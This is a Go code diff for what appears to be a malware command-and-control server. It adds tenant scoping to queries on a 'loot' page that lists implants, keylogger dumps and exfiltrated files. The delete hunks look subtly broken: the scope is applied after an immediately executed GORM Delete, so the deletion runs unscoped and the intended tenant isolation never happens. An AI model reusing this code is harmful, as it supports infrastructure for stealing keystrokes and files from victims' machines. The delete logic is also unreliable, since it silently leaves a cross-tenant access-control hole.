@@ -77,7 +77,9 @@ func mapLootTasks(tasks []db.Task) []lootTaskDTO {
 func (s *Server) handleLootPage(c *gin.Context) {
 	// Get all agents
 	var agents []db.Implant
-	if err := s.db.Order("last_seen desc").Limit(LootAgentLimit).Find(&agents).Error; err != nil {
+	q := s.db.Order("last_seen desc")
+	q = s.tenantScope(q, c)
+	if err := q.Limit(LootAgentLimit).Find(&agents).Error; err != nil {
 		handleQueryError(c, err, "Failed to query loot agents")
 		return
 	}
@@ -116,8 +118,10 @@ func (s *Server) handleLootPage(c *gin.Context) {
 
 	// Keylogger dumps
 	var keylogTasks []db.Task
-	if err := s.db.Preload("Agent").
-		Where("type = ?", "keylogger_dump").
+	keylogQ := s.db.Preload("Agent").
+		Where("type = ?", "keylogger_dump")
+	keylogQ = s.tenantScope(keylogQ, c)
+	if err := keylogQ.
 		Order("created_at desc").Limit(50).Find(&keylogTasks).Error; err != nil {
 		handleQueryError(c, err, "Failed to query keylog tasks")
 		return
@@ -126,8 +130,10 @@ func (s *Server) handleLootPage(c *gin.Context) {
 	// Recent file pulls. Exfil is type=upload with no push payload.
 	// download_url is the implant fetching a URL onto its own disk — not a teamserver blob.
 	var downloadTasks []db.Task
-	if err := s.db.Preload("Agent").
-		Where("(type = ? AND (data = '' OR data IS NULL)) OR type = ?", "upload", "download").
+	downloadQ := s.db.Preload("Agent").
+		Where("(type = ? AND (data = '' OR data IS NULL)) OR type = ?", "upload", "download")
+	downloadQ = s.tenantScope(downloadQ, c)
+	if err := downloadQ.
 		Order("created_at desc").Limit(50).Find(&downloadTasks).Error; err != nil {
 		handleQueryError(c, err, "Failed to query download tasks")
 		return
@@ -187,12 +193,16 @@ func (s *Server) handleLootBulkDelete(c *gin.Context) {
 				}
 			}
 		case "keylog":
-			res := s.db.Delete(&db.Task{}, "id = ? AND type IN ?", id, []string{"keylogger_dump", "keylogger_start"})
+			deleteQ := s.db.Delete(&db.Task{}, "id = ? AND type IN ?", id, []string{"keylogger_dump", "keylogger_start"})
+			deleteQ = s.tenantScope(deleteQ, c)
+			res := deleteQ
 			if res.Error == nil && res.RowsAffected > 0 {
 				deleted++
 			}
 		case "download":
-			res := s.db.Delete(&db.Task{}, "id = ? AND type IN ?", id, []string{"download", "upload"})
+			deleteQ := s.db.Delete(&db.Task{}, "id = ? AND type IN ?", id, []string{"download", "upload"})
+			deleteQ = s.tenantScope(deleteQ, c)
+			res := deleteQ
 			if res.Error == nil && res.RowsAffected > 0 {
 				deleted++
 			}
